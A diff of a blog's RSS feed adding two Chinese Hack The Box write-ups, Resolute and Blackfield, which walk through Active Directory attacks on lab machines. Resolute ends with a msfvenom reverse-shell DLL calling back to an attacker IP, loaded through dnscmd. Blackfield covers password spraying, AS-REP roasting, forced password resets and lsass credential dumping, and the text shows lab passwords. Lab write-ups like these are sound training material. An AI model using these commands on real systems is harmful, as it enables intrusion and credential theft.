@@ -7,7 +7,519 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>zh-cn</language>
         <copyright>Example Person</copyright>
-        <lastBuildDate>Sat, 22 Mar 2025 11:43:33 +0000</lastBuildDate><atom:link href="https://nergigantes.github.io/htb/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Sat, 29 Mar 2025 05:38:03 +0000</lastBuildDate><atom:link href="https://nergigantes.github.io/htb/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>Resolute</title>
+        <link>https://nergigantes.github.io/htb/resolute/</link>
+        <pubDate>Sat, 29 Mar 2025 13:36:57 +0800</pubDate>
+        
+        <guid>https://nergigantes.github.io/htb/resolute/</guid>
+        <description>&lt;img src="https://nergigantes.github.io/htb/resolute/10.jpg" alt="Featured image of post Resolute" /&gt;&lt;h1 id=&#34;速通教程&#34;&gt;速通教程：
+&lt;/h1&gt;&lt;p&gt;使用netexec扫一下漏洞&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nxc smb &amp;lt;ip&amp;gt; -u &amp;#39;&amp;#39; -p &amp;#39;&amp;#39; -M zerologon
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;发现该靶机适用&lt;/p&gt;
+&lt;p&gt;直接下载poc利用&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://nergigantes.github.io/htb/resolute/1743167592656-14920750-9d26-4b1a-9c86-f945e9558464.png&#34;
+	width=&#34;1102&#34;
+	height=&#34;368&#34;
+	srcset=&#34;https://nergigantes.github.io/htb/resolute/1743167592656-14920750-9d26-4b1a-9c86-f945e9558464_hu73d093d354ad10802368004ddeeccb36_333090_480x0_resize_box_3.png 480w, https://nergigantes.github.io/htb/resolute/1743167592656-14920750-9d26-4b1a-9c86-f945e9558464_hu73d093d354ad10802368004ddeeccb36_333090_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;299&#34;
+		data-flex-basis=&#34;718px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;成功了。。&lt;/p&gt;
+&lt;h1 id=&#34;以学习目的来还是一步一步来看看其他的方法&#34;&gt;以学习目的来，还是一步一步来看看其他的方法
+&lt;/h1&gt;&lt;p&gt;浅浅的扫一个端口&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://nergigantes.github.io/htb/resolute/1743165991060-fda2ef86-0541-470d-ac92-afa79311099e.png&#34;
+	width=&#34;1125&#34;
+	height=&#34;618&#34;
+	srcset=&#34;https://nergigantes.github.io/htb/resolute/1743165991060-fda2ef86-0541-470d-ac92-afa79311099e_hua4d367766ff2f64c62a70748e2449c32_450383_480x0_resize_box_3.png 480w, https://nergigantes.github.io/htb/resolute/1743165991060-fda2ef86-0541-470d-ac92-afa79311099e_hua4d367766ff2f64c62a70748e2449c32_450383_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;182&#34;
+		data-flex-basis=&#34;436px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;域名：megabank.local&lt;/p&gt;
+&lt;p&gt;能够以匿名用户登陆rpc&lt;/p&gt;
+&lt;p&gt;rpcclient -U &amp;quot;&amp;quot; -N 10.10.10.169&lt;/p&gt;
+&lt;p&gt;并且能够执行enumdomusers命令列举用户&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://nergigantes.github.io/htb/resolute/1743166061642-b6279afd-c139-4874-aaa8-a2bc096cc2f5.png&#34;
+	width=&#34;1047&#34;
+	height=&#34;814&#34;
+	srcset=&#34;https://nergigantes.github.io/htb/resolute/1743166061642-b6279afd-c139-4874-aaa8-a2bc096cc2f5_hu1323cb25abffdd4860c2d73941f79bc6_329989_480x0_resize_box_3.png 480w, https://nergigantes.github.io/htb/resolute/1743166061642-b6279afd-c139-4874-aaa8-a2bc096cc2f5_hu1323cb25abffdd4860c2d73941f79bc6_329989_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;128&#34;
+		data-flex-basis=&#34;308px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;使用netexec枚举一下通过smb活动的用户&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://nergigantes.github.io/htb/resolute/1743168035799-22023b6e-d1b3-4960-895a-32b64ac82367.png&#34;
+	width=&#34;1182&#34;
+	height=&#34;851&#34;
+	srcset=&#34;https://nergigantes.github.io/htb/resolute/1743168035799-22023b6e-d1b3-4960-895a-32b64ac82367_huc88adcc6d93743e3de8a50cce17fa668_304797_480x0_resize_box_3.png 480w, https://nergigantes.github.io/htb/resolute/1743168035799-22023b6e-d1b3-4960-895a-32b64ac82367_huc88adcc6d93743e3de8a50cce17fa668_304797_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;138&#34;
+		data-flex-basis=&#34;333px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;发现了一个有趣的东西&lt;/p&gt;
+&lt;p&gt;marko                         2019-09-27 13:17:14 0       Account created. Password set to Welcome123!&lt;/p&gt;
+&lt;p&gt;尝试使用这个密码登陆，失败，那就用这个密码进行喷洒&lt;/p&gt;
+&lt;p&gt;先把这些用户存起来&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nxc smb 10.10.10.169 -u 1.txt -p Welcome123!
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://nergigantes.github.io/htb/resolute/1743168382297-8a483090-7d15-4c43-b562-1a6c51209072.png&#34;
+	width=&#34;1189&#34;
+	height=&#34;624&#34;
+	srcset=&#34;https://nergigantes.github.io/htb/resolute/1743168382297-8a483090-7d15-4c43-b562-1a6c51209072_hucc58ba8db2c595ccdd37ca70bcedb53a_235927_480x0_resize_box_3.png 480w, https://nergigantes.github.io/htb/resolute/1743168382297-8a483090-7d15-4c43-b562-1a6c51209072_hucc58ba8db2c595ccdd37ca70bcedb53a_235927_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;190&#34;
+		data-flex-basis=&#34;457px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;可以看到melanie用户对映这个密码&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://nergigantes.github.io/htb/resolute/1743168484793-de144225-3fb7-444f-a3b7-5beaa70e83d6.png&#34;
+	width=&#34;1069&#34;
+	height=&#34;657&#34;
+	srcset=&#34;https://nergigantes.github.io/htb/resolute/1743168484793-de144225-3fb7-444f-a3b7-5beaa70e83d6_hua314ff6b85ab41852b8a08ca7c2ec28c_220257_480x0_resize_box_3.png 480w, https://nergigantes.github.io/htb/resolute/1743168484793-de144225-3fb7-444f-a3b7-5beaa70e83d6_hua314ff6b85ab41852b8a08ca7c2ec28c_220257_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;162&#34;
+		data-flex-basis=&#34;390px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;之后看看bloodhound&lt;/p&gt;
+&lt;p&gt;目前这个用户没有什么可以进行利用的东西&lt;/p&gt;
+&lt;p&gt;上传winpeas看看还有什么东西遗漏了&lt;/p&gt;
+&lt;p&gt;很奇怪，这个靶机的winpeas用不了。。&lt;/p&gt;
+&lt;p&gt;最后能够找到一个隐藏的文件&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;type PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;里面存放了ryan的密码&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://nergigantes.github.io/htb/resolute/1743171446507-02fb3d9b-e338-4996-bdab-592dfc4760f9.png&#34;
+	width=&#34;1048&#34;
+	height=&#34;654&#34;
+	srcset=&#34;https://nergigantes.github.io/htb/resolute/1743171446507-02fb3d9b-e338-4996-bdab-592dfc4760f9_hua91333ccd9fa69dde23ef76d645804ca_123411_480x0_resize_box_3.png 480w, https://nergigantes.github.io/htb/resolute/1743171446507-02fb3d9b-e338-4996-bdab-592dfc4760f9_hua91333ccd9fa69dde23ef76d645804ca_123411_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;160&#34;
+		data-flex-basis=&#34;384px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Serv3r4Admin4cc123!&lt;/p&gt;
+&lt;p&gt;在bloodhound里查看ryan&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://nergigantes.github.io/htb/resolute/1743171500985-e707a7f6-17e1-4213-aab3-4fcf5eec64fa.png&#34;
+	width=&#34;1403&#34;
+	height=&#34;891&#34;
+	srcset=&#34;https://nergigantes.github.io/htb/resolute/1743171500985-e707a7f6-17e1-4213-aab3-4fcf5eec64fa_hu72b8d5596a7f0f2728e6d993090631be_105162_480x0_resize_box_3.png 480w, https://nergigantes.github.io/htb/resolute/1743171500985-e707a7f6-17e1-4213-aab3-4fcf5eec64fa_hu72b8d5596a7f0f2728e6d993090631be_105162_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;157&#34;
+		data-flex-basis=&#34;377px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;能够看到这个账号是DNSADMIN用户里的，这样就可以进行提权了&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.16.21 LPORT=9001 -f dll &amp;gt; ff.dll
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;生成木马dll,利用impacket-smbserver开启smb服务远程挂载木马dll(上传本地会被吞)&lt;/p&gt;
+&lt;p&gt;记得修改木马文件权限不然会失败&lt;/p&gt;
+&lt;p&gt;chmod 777 ff.dll&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;impacket-smbserver s ./
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;之后执行&lt;/p&gt;
+&lt;p&gt;cmd /c dnscmd localhost /config /serverlevelplugindll \10.10.16.21\s\ff.dll&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://nergigantes.github.io/htb/resolute/1743225950746-61678890-8828-4116-b4b0-d581f8658a6e.png&#34;
+	width=&#34;1177&#34;
+	height=&#34;477&#34;
+	srcset=&#34;https://nergigantes.github.io/htb/resolute/1743225950746-61678890-8828-4116-b4b0-d581f8658a6e_hu8e87ae367af7c642ba8abf2c7f8c93f6_180817_480x0_resize_box_3.png 480w, https://nergigantes.github.io/htb/resolute/1743225950746-61678890-8828-4116-b4b0-d581f8658a6e_hu8e87ae367af7c642ba8abf2c7f8c93f6_180817_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;246&#34;
+		data-flex-basis=&#34;592px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;sc.exe stop dns&lt;/p&gt;
+&lt;p&gt;sc.exe start dns&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://nergigantes.github.io/htb/resolute/1743226347930-fb6765c7-7994-4e21-b6ee-df68bbb1d87a.png&#34;
+	width=&#34;2100&#34;
+	height=&#34;721&#34;
+	srcset=&#34;https://nergigantes.github.io/htb/resolute/1743226347930-fb6765c7-7994-4e21-b6ee-df68bbb1d87a_hu6a46a415404ee219ad3125391c146c5c_417712_480x0_resize_box_3.png 480w, https://nergigantes.github.io/htb/resolute/1743226347930-fb6765c7-7994-4e21-b6ee-df68bbb1d87a_hu6a46a415404ee219ad3125391c146c5c_417712_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;291&#34;
+		data-flex-basis=&#34;699px&#34;
+	
+&gt;&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>Blackfield</title>
+        <link>https://nergigantes.github.io/htb/blackfield/</link>
+        <pubDate>Sat, 29 Mar 2025 13:36:53 +0800</pubDate>
+        
+        <guid>https://nergigantes.github.io/htb/blackfield/</guid>
+        <description>&lt;img src="https://nergigantes.github.io/htb/blackfield/19.jpg" alt="Featured image of post Blackfield" /&gt;&lt;p&gt;扫一下端口&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://nergigantes.github.io/htb/blackfield/1742784922578-e573fa60-eb3d-4381-b080-4edb2318aaf0.png&#34;
+	width=&#34;1178&#34;
+	height=&#34;799&#34;
+	srcset=&#34;https://nergigantes.github.io/htb/blackfield/1742784922578-e573fa60-eb3d-4381-b080-4edb2318aaf0_hu2370eb7888846484cf71d579c686ed9c_1014451_480x0_resize_box_3.png 480w, https://nergigantes.github.io/htb/blackfield/1742784922578-e573fa60-eb3d-4381-b080-4edb2318aaf0_hu2370eb7888846484cf71d579c686ed9c_1014451_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;147&#34;
+		data-flex-basis=&#34;353px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;没看到具体的域名，用crackmapexec看一下&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://nergigantes.github.io/htb/blackfield/1742785021601-22f57dc8-f7da-41ef-aa20-7b879b022791.png&#34;
+	width=&#34;1187&#34;
+	height=&#34;477&#34;
+	srcset=&#34;https://nergigantes.github.io/htb/blackfield/1742785021601-22f57dc8-f7da-41ef-aa20-7b879b022791_hu8abfa9238783e2932218477094aba48f_194668_480x0_resize_box_3.png 480w, https://nergigantes.github.io/htb/blackfield/1742785021601-22f57dc8-f7da-41ef-aa20-7b879b022791_hu8abfa9238783e2932218477094aba48f_194668_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;248&#34;
+		data-flex-basis=&#34;597px&#34;
+	
+&gt;BLACKFIELD.local 域名知道了，之后根据开放的端口看一下，kerbrute,rpcclient都没有有用的信息，smb发现了一个共享的文件&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://nergigantes.github.io/htb/blackfield/1742785141093-8f8f771b-5a3f-41f6-bda8-a92676d9cb33.png&#34;
+	width=&#34;662&#34;
+	height=&#34;254&#34;
+	srcset=&#34;https://nergigantes.github.io/htb/blackfield/1742785141093-8f8f771b-5a3f-41f6-bda8-a92676d9cb33_hu5a8d5330524c586a649175389f57bf6d_48347_480x0_resize_box_3.png 480w, https://nergigantes.github.io/htb/blackfield/1742785141093-8f8f771b-5a3f-41f6-bda8-a92676d9cb33_hu5a8d5330524c586a649175389f57bf6d_48347_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;260&#34;
+		data-flex-basis=&#34;625px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;进去看一下&lt;/p&gt;
+&lt;p&gt;smbclient -N //10.10.10.192/profiles$（$用这个是因为是隐藏文件）&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://nergigantes.github.io/htb/blackfield/1742785339249-c800b3a6-813c-4cf5-aa9c-ff79faf35792.png&#34;
+	width=&#34;973&#34;
+	height=&#34;814&#34;
+	srcset=&#34;https://nergigantes.github.io/htb/blackfield/1742785339249-c800b3a6-813c-4cf5-aa9c-ff79faf35792_hud8612a6acc75b83f66a155f84baf18d2_228082_480x0_resize_box_3.png 480w, https://nergigantes.github.io/htb/blackfield/1742785339249-c800b3a6-813c-4cf5-aa9c-ff79faf35792_hud8612a6acc75b83f66a155f84baf18d2_228082_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;119&#34;
+		data-flex-basis=&#34;286px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;这应该是一个用户名的列表，进行AS-REP Roasting攻击&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://nergigantes.github.io/htb/blackfield/1742785829065-71993d75-eca6-4eed-809a-51092cec3e46.png&#34;
+	width=&#34;1177&#34;
+	height=&#34;280&#34;
+	srcset=&#34;https://nergigantes.github.io/htb/blackfield/1742785829065-71993d75-eca6-4eed-809a-51092cec3e46_hube46d7ff689546758bfde8f38bec0e34_162584_480x0_resize_box_3.png 480w, https://nergigantes.github.io/htb/blackfield/1742785829065-71993d75-eca6-4eed-809a-51092cec3e46_hube46d7ff689546758bfde8f38bec0e34_162584_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;420&#34;
+		data-flex-basis=&#34;1008px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;拿到了一个support用户的hash，爆破一下&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://nergigantes.github.io/htb/blackfield/1742785920751-1d690e14-cbde-4d79-8c88-a5bf62bb5de4.png&#34;
+	width=&#34;1124&#34;
+	height=&#34;699&#34;
+	srcset=&#34;https://nergigantes.github.io/htb/blackfield/1742785920751-1d690e14-cbde-4d79-8c88-a5bf62bb5de4_huf625f3157094564174504dc44e3e471b_347326_480x0_resize_box_3.png 480w, https://nergigantes.github.io/htb/blackfield/1742785920751-1d690e14-cbde-4d79-8c88-a5bf62bb5de4_huf625f3157094564174504dc44e3e471b_347326_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;160&#34;
+		data-flex-basis=&#34;385px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;之前看到了5985是开放的,evil-winrm登一下&lt;/p&gt;
+&lt;p&gt;evil-winrm -i 10.10.10.192 -u support -p #00^BlackKnight&lt;/p&gt;
+&lt;p&gt;登不了，smbexec也是一样，没有shell&lt;/p&gt;
+&lt;p&gt;那就用bloodhound-python去分析一下&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;bloodhound-python -c ALL -u support -p &amp;#39;#00^BlackKnight&amp;#39; -d blackfield.local -dc dc01.blackfield.local -ns 10.10.10.192
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;support用户没有什么权限可利用的，除了能对一个&lt;img src=&#34;https://nergigantes.github.io/htb/blackfield/1742799700716-fb6185aa-182d-4b06-9dda-9d95a3afaa7e.png&#34;
+	width=&#34;2401&#34;
+	height=&#34;933&#34;
+	srcset=&#34;https://nergigantes.github.io/htb/blackfield/1742799700716-fb6185aa-182d-4b06-9dda-9d95a3afaa7e_hube4db955a3af2539d1c9423fea8bee1c_96949_480x0_resize_box_3.png 480w, https://nergigantes.github.io/htb/blackfield/1742799700716-fb6185aa-182d-4b06-9dda-9d95a3afaa7e_hube4db955a3af2539d1c9423fea8bee1c_96949_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;257&#34;
+		data-flex-basis=&#34;617px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;AUDIT2020的用户有强制更改密码的权限，让我们看看这个权限怎么用&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://room362.com/posts/2017/reset-ad-user-password-with-linux/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://room362.com/posts/2017/reset-ad-user-password-with-linux/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;这篇文章写了如何重置密码，来让我们滥用这个权限&lt;/p&gt;
+&lt;p&gt;使用rpcclient登陆support账户&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;rpcclient -U &amp;lsquo;support&amp;rsquo; 10.10.10.192&lt;/li&gt;
+&lt;li&gt;setuserinfo2 AUDIT2020 23 &amp;lsquo;12345678&amp;rsquo;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;现在来验证一下，失败了，，？&lt;img src=&#34;https://nergigantes.github.io/htb/blackfield/1742801501583-4cf17343-476a-4eab-a81e-d850005fabc3.png&#34;
+	width=&#34;482&#34;
+	height=&#34;51&#34;
+	srcset=&#34;https://nergigantes.github.io/htb/blackfield/1742801501583-4cf17343-476a-4eab-a81e-d850005fabc3_hu69f53e9093138d6587c4ab93e5081b46_17057_480x0_resize_box_3.png 480w, https://nergigantes.github.io/htb/blackfield/1742801501583-4cf17343-476a-4eab-a81e-d850005fabc3_hu69f53e9093138d6587c4ab93e5081b46_17057_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;945&#34;
+		data-flex-basis=&#34;2268px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;更换一下密码 123456789a!&lt;/p&gt;
+&lt;p&gt;成功&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://nergigantes.github.io/htb/blackfield/1742801590855-e1b80d21-6f72-4bd8-b543-ad5302d3d938.png&#34;
+	width=&#34;1214&#34;
+	height=&#34;511&#34;
+	srcset=&#34;https://nergigantes.github.io/htb/blackfield/1742801590855-e1b80d21-6f72-4bd8-b543-ad5302d3d938_hu6229a7a0817ea1cd52c0898a84fece0b_269160_480x0_resize_box_3.png 480w, https://nergigantes.github.io/htb/blackfield/1742801590855-e1b80d21-6f72-4bd8-b543-ad5302d3d938_hu6229a7a0817ea1cd52c0898a84fece0b_269160_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;237&#34;
+		data-flex-basis=&#34;570px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;进去后能翻一个新的文件夹，找到了一个管理员的密码?&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://nergigantes.github.io/htb/blackfield/1742994323198-839f4dce-8200-4c19-aa63-8e227471057f.png&#34;
+	width=&#34;806&#34;
+	height=&#34;325&#34;
+	srcset=&#34;https://nergigantes.github.io/htb/blackfield/1742994323198-839f4dce-8200-4c19-aa63-8e227471057f_hue7c81b88f8dc7dffd43dbb457c15bec5_67161_480x0_resize_box_3.png 480w, https://nergigantes.github.io/htb/blackfield/1742994323198-839f4dce-8200-4c19-aa63-8e227471057f_hue7c81b88f8dc7dffd43dbb457c15bec5_67161_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;248&#34;
+		data-flex-basis=&#34;595px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;很遗憾这是fake。。&lt;/p&gt;
+&lt;p&gt;后面了解的一个重要的压缩包，&lt;strong&gt;lsass.zip&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://nergigantes.github.io/htb/blackfield/1742994469425-08b8fb83-7bf4-425d-b0c3-eea7d1b7ea00.png&#34;
+	width=&#34;1108&#34;
+	height=&#34;655&#34;
+	srcset=&#34;https://nergigantes.github.io/htb/blackfield/1742994469425-08b8fb83-7bf4-425d-b0c3-eea7d1b7ea00_huc4ef1f9d0f564b0fed40e0bafa1f31c6_92403_480x0_resize_box_3.png 480w, https://nergigantes.github.io/htb/blackfield/1742994469425-08b8fb83-7bf4-425d-b0c3-eea7d1b7ea00_huc4ef1f9d0f564b0fed40e0bafa1f31c6_92403_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;169&#34;
+		data-flex-basis=&#34;405px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;用pypykatz lsa minidump lsass.dmp分析了一堆账户密码，最有价值的是这个账户&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://nergigantes.github.io/htb/blackfield/1742995714597-4908c8cd-f6a9-434d-8b5e-97dfa0a2378d.png&#34;
+	width=&#34;1554&#34;
+	height=&#34;835&#34;
+	srcset=&#34;https://nergigantes.github.io/htb/blackfield/1742995714597-4908c8cd-f6a9-434d-8b5e-97dfa0a2378d_hu09fbdeb6b537c46d6cac8f000964e9a1_97192_480x0_resize_box_3.png 480w, https://nergigantes.github.io/htb/blackfield/1742995714597-4908c8cd-f6a9-434d-8b5e-97dfa0a2378d_hu09fbdeb6b537c46d6cac8f000964e9a1_97192_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;186&#34;
+		data-flex-basis=&#34;446px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://nergigantes.github.io/htb/blackfield/1742995743126-468132d3-7c96-4f57-8c37-f4b0d14f5e18.png&#34;
+	width=&#34;775&#34;
+	height=&#34;199&#34;
